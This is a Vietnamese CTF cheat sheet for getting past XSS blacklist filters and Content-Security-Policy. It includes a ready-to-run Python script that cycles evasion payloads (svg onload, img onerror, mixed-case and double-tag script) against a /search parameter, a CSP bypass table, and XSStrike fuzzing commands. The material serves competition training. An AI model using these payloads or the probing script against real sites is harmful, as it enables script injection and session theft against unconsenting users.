# XSS: Né bộ lọc & CSP (khi payload cơ bản bị chặn)

Bài này dùng TIẾP SAU khi bạn đã xác nhận trang có XSS (xem `XSS_CSRF.md`/`XSS_Admin_Bot.md`) nhưng payload cơ bản `<script>alert(1)</script>` **không chạy** — nghĩa là có 1 lớp phòng thủ đang chặn. Có 2 loại phòng thủ hay gặp, mỗi loại né khác nhau:

- **Bộ lọc chặn theo danh sách từ cấm** (blacklist — chặn 1 danh sách chữ "nguy hiểm đã biết" như `script`, `onerror`): không bao giờ liệt kê hết được mọi cách viết — bạn chỉ cần tìm 1 từ/thẻ nó CHƯA nghĩ tới.
- **CSP (Content-Security-Policy)**: 1 header HTTP khai báo "chỉ script từ domain X mới được chạy, không cho chạy script viết thẳng trong trang" — nếu có CSP chặt, `<script>` viết trực tiếp (gọi là inline) sẽ bị trình duyệt tự chặn, không chạy, dù chèn lọt vào HTML.

Ví dụ dễ hiểu vì sao blacklist luôn bị né được: giả sử bộ lọc chỉ xoá đúng 1 lần chữ `<script>`. Bạn gõ `<scr<script>ipt>alert(1)</scr<script>ipt>` — bộ lọc xoá đúng 1 đoạn `<script>` ở giữa, nhưng việc xoá đó lại **vô tình ghép 2 phần còn lại thành 1 thẻ `<script>alert(1)</script>` hoàn chỉnh mới**! Bộ lọc tưởng đã chặn xong, nhưng kết quả sau khi xoá lại đúng là thứ nó muốn chặn.

Trên Burp bạn nhận ra cần bài này khi: gửi `<script>alert(1)</script>`, response **không báo lỗi, input vẫn phản chiếu lại trong HTML**, nhưng chuỗi đó bị thiếu 1 phần, bị encode (`&lt;script&gt;`), hoặc có header `Content-Security-Policy` trong response.

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

# Danh sách biến thể né bộ lọc -- thử lần lượt, xem cái nào "sống sót" nguyên vẹn trong response
PAYLOADS = [
    "<svg onload=alert(1)>",                                   # đổi thẻ: không dùng <script>
    "<img src=x onerror=alert(1)>",                             # đổi thẻ + event khác
    "<body onpageshow=alert(1)>",                               # event ít bị lọc tới hơn onerror/onload
    "<ScRiPt>alert(1)</sCrIpT>",                                 # viết hoa/thường lẫn -- né filter chỉ chặn chữ thường
    "<scr<script>ipt>alert(1)</scr<script>ipt>",                 # "double tag" -- né filter chạy đúng 1 lần, không lặp lại
]


def solve_one(session, base_url):
    for p in PAYLOADS:
        r = session.get(f"{base_url}/search", params={"q": p}, timeout=5)
        # Payload "sống sót" nguyên vẹn (không bị xoá/encode) trong response -- tức là né được filter
        if p in r.text:
            print("KHÔNG BỊ CHẶN:", p)
            return p
        print("bị chặn/encode:", p)
    return None


if __name__ == "__main__":
    working = solve_one(s, base)
    print("Payload dùng được:", working)
```

## Giải thích cho người mới

- `PAYLOADS` là danh sách các cách viết KHÁC NHAU để làm cùng 1 việc (chạy được JavaScript), xếp theo mức độ hay gặp — vòng `for` thử lần lượt, không cần biết trước bộ lọc chặn kiểu gì.
- `if p in r.text:` kiểm tra xem đúng chuỗi payload còn giữ NGUYÊN VẸN trong response hay không. Nếu bộ lọc đã xoá/sửa/encode payload, chuỗi gốc `p` sẽ không còn xuất hiện y nguyên nữa — đây là cách phát hiện "payload này có bị chặn không" mà không cần mở trình duyệt xem từng lần.
- Thẻ `<svg>`/`<body>` thay cho `<script>`: nhiều bộ lọc chỉ nhớ chặn `<script>` vì đó là cách "kinh điển" nhất, nhưng quên rằng HTML có hàng chục thẻ khác hỗ trợ "event handler" (`onload`, `onerror`, `onpageshow`...) — các thuộc tính này cũng tự chạy JavaScript khi trình duyệt kích hoạt đúng sự kiện (ảnh lỗi, trang hiện lên...), không cần thẻ `<script>` nào cả.
- `<ScRiPt>`: HTML **không phân biệt hoa/thường** ở tên thẻ và thuộc tính — `<ScRiPt>` và `<script>` được trình duyệt hiểu là y hệt nhau, nhưng 1 bộ lọc chỉ so khớp đúng chữ thường (`"script" in text.lower()` nhưng lại viết sai thành so chuỗi gốc) sẽ bỏ lọt nó.
- `<scr<script>ipt>...`: xem ví dụ "double tag" ở phần giải thích trên — chỉ hoạt động khi bộ lọc dùng kiểu `text.replace("<script>", "")` chạy **đúng 1 lần** (không lặp lại cho tới khi hết sạch).

## Nếu có CSP (Content-Security-Policy) chặn script

CSP không phải bộ lọc chặn chữ — nó là 1 header, trình duyệt tự đọc và tự chặn script không đúng nguồn được khai báo. Đọc header `Content-Security-Policy` trong response để biết đang bị chặn kiểu gì:

| Header thấy | Ý nghĩa | Hướng né |
|---|---|---|
| `script-src 'self'` | Chỉ script load từ **chính domain đó** mới chạy, không cho viết `<script>` thẳng trong trang (gọi là inline) | Tìm 1 file JS/JSONP có sẵn trên domain đó mà bị lợi dụng được (ít gặp, cần nghiên cứu riêng từng app) |
| `script-src 'self' 'unsafe-inline'` | Vẫn cho chạy `<script>` viết thẳng trong trang | CSP coi như không chặn gì cả đối với các payload ở trên, cứ dùng bình thường |
| `connect-src 'self'` | Chặn `fetch()`/`XMLHttpRequest` gửi dữ liệu RA NGOÀI domain đó | Không gửi được cookie về listener ngoài (xem `XSS_Admin_Bot.md`) — đổi payload thành cho bot **tự làm 1 hành động công khai hoá flag ngay trong domain**, không cần gửi dữ liệu ra ngoài nữa |

```python
r = s.get(f"{base}/search", params={"q": "test"}, timeout=5)
print(r.headers.get("Content-Security-Policy"))   # None nghĩa là KHÔNG có CSP -- không cần lo phần này
```

## Dùng tool có sẵn `XSStrike` để tự fuzz nhiều biến thể hơn

Nếu 5 payload trên đều thất bại, `XSStrike` (có sẵn tại `~/hoc/CTF/Tools/web/XSStrike/`) tự fuzz hàng trăm biến thể và tự phân tích response để đoán đúng kiểu bộ lọc:

```bash
spwn
cd ~/hoc/CTF/Tools/web/XSStrike
python3 xsstrike.py -u "http://target/search?q=FUZZ"
```

- Thay giá trị tham số nghi ngờ bằng chữ `FUZZ` trong URL — XSStrike tự nhận biết vị trí đó để thử payload vào.
- Chạy XSStrike **sau khi** đã tự tay thử payload cơ bản thất bại — nó mạnh ở việc fuzz nhanh nhiều biến thể, nhưng bạn vẫn cần tự hiểu TẠI SAO 1 payload hoạt động (đọc 2 mục trên) để biết cách tái dùng cho các đội khác mà không cần chạy lại XSStrike mỗi lần.
- Thêm wordlist payload có sẵn ở `~/hoc/CTF/Tools/web/PayloadsAllTheThings/XSS Injection/` và `~/hoc/CTF/Tools/web/SecLists/Fuzzing/XSS/` nếu cần nhiều biến thể hơn nữa, dán vào Burp Intruder làm payload list.

## Lưu ý nhanh

- Luôn xác định rõ response trả về NGUYÊN VẸN, BỊ XOÁ 1 PHẦN, hay BỊ ENCODE (`&lt;`) — mỗi trường hợp cần hướng né khác nhau (encode đúng chuẩn thì thường không còn XSS ở chỗ đó nữa, không cần né tiếp).
- Payload hoạt động khi tự `GET` test chưa chắc chạy thật khi mở trình duyệt — kiểm tra `Content-Type` response phải là HTML (không phải `text/plain`/`application/json`), vì trình duyệt chỉ "chạy" script khi render ra như 1 trang HTML thật.
- Không có 1 payload nào ăn được mọi bộ lọc — nếu cả bảng trên và XSStrike đều thất bại, bộ lọc có thể dùng thư viện sanitize chuẩn (DOMPurify/bleach) với allowlist (danh sách thẻ CHO PHÉP, ngược với blacklist) — trường hợp này thường không còn lỗ hổng để khai thác nữa, chuyển sang tìm chỗ khác.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
